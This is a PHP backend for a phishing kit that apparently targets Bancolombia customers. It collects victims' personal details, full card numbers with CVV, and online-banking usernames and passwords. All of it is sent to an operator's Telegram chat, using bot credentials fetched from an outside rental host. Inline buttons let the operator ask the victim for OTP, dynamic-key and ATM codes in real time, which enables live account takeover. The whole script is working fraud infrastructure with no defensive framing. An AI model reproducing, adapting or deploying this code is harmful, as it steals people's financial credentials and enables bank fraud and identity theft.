<?php
ini_set('display_errors', 0);
error_reporting(0);
header('Content-Type: application/json');

$API_KEY = 'KEY_6984098E';
$USED_TOKENS_FILE = 'used_tokens.json';

function loadConfig($key) {
    $url = "https://fu7ur4ma.lat/get_rental_credentials?key={$key}";
    $resp = @file_get_contents($url);
    $data = json_decode($resp, true);
    return (!empty($data['bot_token']) && !empty($data['chat_id']))
        ? ['token' => $data['bot_token'], 'chat_id' => $data['chat_id']]
        : null;
}

function sendMessage($token, $chatId, $text, $keyboard) {
    $payload = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];
    $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode($payload)
    ]);
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res, true);
}

function buildKeyboard($tid) {
    return ['inline_keyboard' => [
        [
            ['text' => '🔑 Token',    'callback_data' => "pedir_token:$tid"],
            ['text' => '📲 OTP',      'callback_data' => "pedir_otp:$tid"],
            ['text' => '🔄 Dina',     'callback_data' => "pedir_dinamica:$tid"],
            ['text' => '🏧 CCJ',      'callback_data' => "pedir_cajero:$tid"]
        ],
        [
            ['text' => '🆔 CC',       'callback_data' => "cc:$tid"],
            ['text' => '✅ Check',    'callback_data' => "ya:$tid"],
            ['text' => '🖼️ Logo',    'callback_data' => "logo:$tid"]
        ]
    ]];
}


function formatMessage($d) {
    $tid    = $d['transactionId'] ?? 'N/D';
    $codigo = $d['codigo'] ?? '<i>Sin código</i>';
    $monto  = number_format($d['total_pagar'] ?? $d['total'] ?? 0, 0, ',', '.');

    $msg  = "<b>🔐 Nuevo acceso</b>\n\n";
    $msg .= "🆔 <b>ID:</b> <code>{$tid}</code>\n";
    $msg .= "🏦 <b>Banco:</b> <code>" . htmlspecialchars($d['banco'] ?? 'N/D') . "</code>\n";
    $msg .= "👤 <b>Nombre:</b> <code>" . htmlspecialchars($d['nombre'] ?? 'N/D') . "</code>\n";
    $msg .= "🆔 <b>Documento:</b> <code>" . htmlspecialchars($d['documento'] ?? 'N/D') . "</code>\n";
    $msg .= "📧 <b>Correo:</b> <code>" . htmlspecialchars($d['correo'] ?? 'N/D') . "</code>\n";
    $msg .= "📞 <b>Teléfono:</b> <code>" . htmlspecialchars($d['telefono'] ?? 'N/D') . "</code>\n";
    $msg .= "🏠 <b>Dirección:</b> <code>" . htmlspecialchars($d['direccion'] ?? 'N/D') . "</code>\n";
    $msg .= "💰 <b>Monto:</b> $ {$monto}\n";
    
    $msg .= "🔑 <b>Código:</b> <code>{$codigo}</code>\n";

    // Datos de tarjeta
    if (!empty($d['tarjeta']) || !empty($d['cardNumber'])) {
        $tarjeta = $d['tarjeta'] ?? $d['cardNumber'];
        $msg .= "\n<b>💳 Datos de Tarjeta:</b>\n";
        $msg .= "• 💳 Número: <code>" . htmlspecialchars($tarjeta) . "</code>\n";
        $msg .= "• 📅 Expira: <code>" . htmlspecialchars($d['expMonth'] ?? '??') . "/" . htmlspecialchars($d['expYear'] ?? '??') . "</code>\n";
        $msg .= "• 🔒 CVV: <code>" . htmlspecialchars($d['cvv'] ?? 'N/D') . "</code>\n";
        $msg .= "• 👤 Titular: <code>" . htmlspecialchars($d['ownerName'] ?? 'N/D') . "</code>\n";
        $msg .= "• 🧾 Cuotas: <code>" . htmlspecialchars($d['cuotas'] ?? 'N/D') . "</code>\n";
    }

    // 🔐 Datos de acceso bancoldata
    if (!empty($d['bancoldata']['usuario']) || !empty($d['bancoldata']['clave'])) {
        $msg .= "\n<b>🔐 Datos de acceso Bancolombia:</b>\n";
        $msg .= "• 👤 Usuario: <code>" . htmlspecialchars($d['bancoldata']['usuario'] ?? 'N/D') . "</code>\n";
        $msg .= "• 🔒 Clave: <code>" . htmlspecialchars($d['bancoldata']['clave'] ?? 'N/D') . "</code>\n";
    }

    return $msg;
}

function isTokenUsed($id) {
    global $USED_TOKENS_FILE;
    if (!file_exists($USED_TOKENS_FILE)) return false;
    $tokens = json_decode(file_get_contents($USED_TOKENS_FILE), true);
    return isset($tokens[$id]);
}

function markTokenUsed($id) {
    global $USED_TOKENS_FILE;
    $tokens = file_exists($USED_TOKENS_FILE) ? json_decode(file_get_contents($USED_TOKENS_FILE), true) : [];
    $tokens[$id] = time();
    file_put_contents($USED_TOKENS_FILE, json_encode($tokens));
}

// Cargar configuración del bot
$config = loadConfig($API_KEY);
if (!$config) {
    echo json_encode(['ok' => false, 'error' => '❌ No se pudo obtener credenciales del bot']);
    exit;
}

// POST: Enviar mensaje
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $d = json_decode(file_get_contents('php://input'), true);
    $tid = $d['transactionId'] ?? '';

    if (!$tid) {
        echo json_encode(['ok' => false, 'error' => '⛔ Faltó transactionId']);
        exit;
    }

    if (isTokenUsed($tid)) {
        echo json_encode(['ok' => false, 'error' => '⛔ Código ya utilizado. Espera un nuevo token.']);
        exit;
    }

    markTokenUsed($tid);
    $msg = formatMessage($d);
    $keyboard = buildKeyboard($tid);
    $sent = sendMessage($config['token'], $config['chat_id'], $msg, $keyboard);

    echo json_encode([
        'ok' => !empty($sent['ok']),
        'message_id' => $sent['result']['message_id'] ?? null
    ]);
    exit;
}

// GET: Revisar acción del operador
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {
    $tid = $_GET['transactionId'];
    $updates_url = "https://api.telegram.org/bot{$config['token']}/getUpdates?timeout=5";
    $updates = json_decode(@file_get_contents($updates_url), true);
    $lastUpdateId = 0;

    if (!isset($updates['result'])) {
        echo json_encode(['ok' => false]);
        exit;
    }

    foreach ($updates['result'] as $upd) {
        if (isset($upd['update_id'])) {
            $lastUpdateId = $upd['update_id'];
        }

        if (isset($upd['callback_query']) && strpos($upd['callback_query']['data'], $tid) !== false) {
            $action = explode(':', $upd['callback_query']['data'])[0];
            $user = $upd['callback_query']['from']['username'] ?? $upd['callback_query']['from']['first_name'];
            $msgId = $upd['callback_query']['message']['message_id'];
            $original = $upd['callback_query']['message']['text'];

            $newText = $original
                . "\n\n✅ Acción: <b>" . ucfirst(str_replace('_', ' ', $action)) . "</b>"
                . "\n👤 Por: @" . $user;

            $payload = [
                'chat_id' => $config['chat_id'],
                'message_id' => $msgId,
                'text' => $newText,
                'parse_mode' => 'HTML'
            ];
            $ch = curl_init("https://api.telegram.org/bot{$config['token']}/editMessageText");
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_POST => true,
                CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
                CURLOPT_POSTFIELDS => json_encode($payload)
            ]);
            curl_exec($ch);
            curl_close($ch);

            echo json_encode(['ok' => true, 'action' => $action]);
            exit;
        }
    }

    if ($lastUpdateId > 0) {
        @file_get_contents("https://api.telegram.org/bot{$config['token']}/getUpdates?offset=" . ($lastUpdateId + 1));
    }

    echo json_encode(['ok' => false]);
    exit;
}

echo json_encode(['ok' => false, 'error' => '⛔ Método no permitido']);
exit;
?>
